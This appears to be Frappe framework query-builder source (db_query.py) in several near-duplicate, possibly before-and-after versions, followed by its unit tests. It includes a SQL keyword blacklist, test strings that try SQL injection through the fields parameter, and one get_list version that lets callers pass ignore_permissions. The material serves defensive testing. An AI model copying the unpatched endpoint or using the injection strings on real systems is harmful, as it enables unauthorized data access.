					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	kwargs.pop('ignore_permissions', None)

	# If doctype is child table
	if frappe.is_table(doctype):
		# Example frappe.db.get_list('Purchase Receipt Item', {'parent': 'Purchase Receipt'})
		# Here purchase receipt is the parent doctype of the child doctype Purchase Receipt Item

		if not kwargs.get('parent'):
			frappe.flags.error_message = _('Parent is required to get child table data')
			raise frappe.PermissionError(doctype)

		check_parent_permission(kwargs.get('parent'), doctype)
		del kwargs['parent']

	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				 ' or '.join(self.or_conditions)                    

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''
		regex = re.compile('^.*[,();].*')                    
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)

		for field in self.fields:
			if regex.match(field):                    
				if any(keyword in field.lower() for keyword in blacklisted_keywords):                    
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() \                    
					for keyword in blacklisted_functions):                    
					_raise_exception()

	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt
from __future__ import unicode_literals

import frappe, unittest

from frappe.model.db_query import DatabaseQuery
from frappe.desk.reportview import get_filters_cond

class TestReportview(unittest.TestCase):
	def test_basic(self):
		self.assertTrue({"name":"DocType"} in DatabaseQuery("DocType").execute(limit_page_length=None))

	def test_fields(self):
		self.assertTrue({"name":"DocType", "issingle":0} \
			in DatabaseQuery("DocType").execute(fields=["name", "issingle"], limit_page_length=None))

	def test_filters_1(self):
		self.assertFalse({"name":"DocType"} \
			in DatabaseQuery("DocType").execute(filters=[["DocType", "name", "like", "J%"]]))

	def test_filters_2(self):
		self.assertFalse({"name":"DocType"} \
			in DatabaseQuery("DocType").execute(filters=[{"name": ["like", "J%"]}]))

	def test_filters_3(self):
		self.assertFalse({"name":"DocType"} \
			in DatabaseQuery("DocType").execute(filters={"name": ["like", "J%"]}))

	def test_filters_4(self):
		self.assertTrue({"name":"DocField"} \
			in DatabaseQuery("DocType").execute(filters={"name": "DocField"}))

	def test_in_not_in_filters(self):
		self.assertFalse(DatabaseQuery("DocType").execute(filters={"name": ["in", None]}))
		self.assertTrue({"name":"DocType"} \
				in DatabaseQuery("DocType").execute(filters={"name": ["not in", None]}))

		for result in [{"name":"DocType"}, {"name":"DocField"}]:
			self.assertTrue(result
				in DatabaseQuery("DocType").execute(filters={"name": ["in", 'DocType,DocField']}))

		for result in [{"name":"DocType"}, {"name":"DocField"}]:
			self.assertFalse(result
				in DatabaseQuery("DocType").execute(filters={"name": ["not in", 'DocType,DocField']}))

	def test_or_filters(self):
		data = DatabaseQuery("DocField").execute(
				filters={"parent": "DocType"}, fields=["fieldname", "fieldtype"],
				or_filters=[{"fieldtype":"Table"}, {"fieldtype":"Select"}])

		self.assertTrue({"fieldtype":"Table", "fieldname":"fields"} in data)
		self.assertTrue({"fieldtype":"Select", "fieldname":"document_type"} in data)
		self.assertFalse({"fieldtype":"Check", "fieldname":"issingle"} in data)

	def test_between_filters(self):
		""" test case to check between filter for date fields """
		frappe.db.sql("delete from tabEvent")

		# create events to test the between operator filter
		todays_event = create_event()
		event1 = create_event(starts_on="2016-07-05 23:59:59")
		event2 = create_event(starts_on="2016-07-06 00:00:00")
		event3 = create_event(starts_on="2016-07-07 23:59:59")
		event4 = create_event(starts_on="2016-07-08 00:00:01")

		# if the values are not passed in filters then event should be filter as current datetime
		data = DatabaseQuery("Event").execute(
			filters={"starts_on": ["between", None]}, fields=["name"])

		self.assertTrue({ "name": event1.name } not in data)

		# if both from and to_date values are passed
		data = DatabaseQuery("Event").execute(
			filters={"starts_on": ["between", ["2016-07-06", "2016-07-07"]]},
			fields=["name"])

		self.assertTrue({ "name": event2.name } in data)
		self.assertTrue({ "name": event3.name } in data)
		self.assertTrue({ "name": event1.name } not in data)
		self.assertTrue({ "name": event4.name } not in data)

		# if only one value is passed in the filter
		data = DatabaseQuery("Event").execute(
			filters={"starts_on": ["between", ["2016-07-07"]]},
			fields=["name"])

		self.assertTrue({ "name": event3.name } in data)
		self.assertTrue({ "name": event4.name } in data)
		self.assertTrue({ "name": todays_event.name } in data)
		self.assertTrue({ "name": event1.name } not in data)
		self.assertTrue({ "name": event2.name } not in data)

	def test_ignore_permissions_for_get_filters_cond(self):
		frappe.set_user('test1@example.com')
		self.assertRaises(frappe.PermissionError, get_filters_cond, 'DocType', dict(istable=1), [])
		self.assertTrue(get_filters_cond('DocType', dict(istable=1), [], ignore_permissions=True))
		frappe.set_user('Administrator')

	def test_query_fields_sanitizer(self):
		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
				fields=["name", "issingle, version()"], limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, IF(issingle=1, (select name from tabUser), count(name))"],
			limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, (select count(*) from tabSessions)"],
			limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, SELECT LOCATE('', `tabUser`.`user`) AS user;"],
			limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, IF(issingle=1, (SELECT name from tabUser), count(*))"],
			limit_start=0, limit_page_length=1)

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle", "count(name)"],
			limit_start=0, limit_page_length=1)
		self.assertTrue('count(name)' in data[0])

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle", "locate('', name) as _relevance"],
			limit_start=0, limit_page_length=1)
		self.assertTrue('_relevance' in data[0])

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle", "date(creation) as creation"],
			limit_start=0, limit_page_length=1)
		self.assertTrue('creation' in data[0])

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle",
			"datediff(modified, creation) as date_diff"], limit_start=0, limit_page_length=1)
		self.assertTrue('date_diff' in data[0])

def create_event(subject="_Test Event", starts_on=None):
	""" create a test event """

	from frappe.utils import get_datetime

	event = frappe.get_doc({
		"doctype": "Event",
		"subject": subject,
		"event_type": "Public",
		"starts_on": get_datetime(starts_on),
	}).insert(ignore_permissions=True)

	return event                    


# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
